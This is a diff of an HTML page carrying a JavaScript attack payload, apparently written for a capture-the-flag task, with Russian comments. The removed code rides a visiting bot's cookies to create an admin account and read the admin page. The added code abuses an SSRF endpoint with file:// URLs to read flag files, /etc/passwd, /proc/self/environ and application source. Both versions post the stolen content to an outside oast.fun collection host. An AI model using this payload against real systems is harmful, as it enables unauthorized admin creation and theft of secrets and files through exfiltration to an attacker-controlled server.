@@ -1,50 +1,55 @@
 <!DOCTYPE html>
-<html>
-<body>
 <script>
 const TARGET = 'https://tasks.goidactf.ru:20431';
 const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';
 
-// Когда БОТ загрузит эту страницу, он выполнит код со СВОИМИ куками
+// Файлы для чтения через SSRF
+const files = [
+    '/flag',
+    '/flag.txt',
+    '/app/flag.txt', 
+    '/home/flag',
+    '/root/flag',
+    '/var/www/html/flag.txt',
+    '/etc/passwd',
+    '/proc/self/environ',
+    '/app/app.py',
+    '/app/server.py'
+];
 
-// 1. Создаём админа используя куки бота
-fetch(TARGET + '/create_admin', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-    credentials: 'include', // Ключево! Куки бота отправятся
-    body: 'new_admin_login=BOT_CREATED_' + Date.now()
-})
-.then(response => response.text())
-.then(data => {
-    // 2. Результат отправляем на наш сервер
-    fetch(COLLAB + '/result', {
-        method: 'POST',
-        mode: 'no-cors',
-        body: data.substring(0, 2000)
-    });
-    
-    // 3. Также пробуем получить админскую страницу
-    return fetch(TARGET + '/admin', {
-        credentials: 'include'
-    });
-})
-.then(response => response.text())
-.then(adminPage => {
-    // 4. Отправляем админку
-    fetch(COLLAB + '/admin_page', {
-        method: 'POST',
-        mode: 'no-cors',
-        body: adminPage.substring(0, 3000)
-    });
-})
-.catch(error => {
-    // 5. Отправляем ошибку
-    fetch(COLLAB + '/error', {
-        method: 'POST',
-        mode: 'no-cors',
-        body: error.toString()
-    });
+// Читаем каждый файл и отправляем результат
+files.forEach((file, index) => {
+    setTimeout(() => {
+        // 1. Запрашиваем файл через SSRF
+        fetch(TARGET + '/get_url', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                url: 'file://' + file
+            })
+        })
+        .then(response => {
+            // 2. Получаем ответ от /get_url (этот fetch СРАБОТАЕТ, т.к. это same-origin)
+            return response.text();
+        })
+        .then(ssrfResult => {
+            // 3. Отправляем результат на наш вебхук
+            // Этот fetch в режиме no-cors - CORS не помешает
+            fetch(COLLAB + '/file_result', {
+                method: 'POST',
+                mode: 'no-cors',
+                body: '=== FILE: ' + file + ' ===\n\n' + 
+                      ssrfResult.substring(0, 5000)
+            });
+        })
+        .catch(error => {
+            // 4. Отправляем ошибку
+            fetch(COLLAB + '/error', {
+                method: 'POST', 
+                mode: 'no-cors',
+                body: 'Error reading ' + file + ': ' + error
+            });
+        });
+    }, index * 2000); // Задержка 2 секунды между запросами
 });
 </script>
-</body>
-</html>
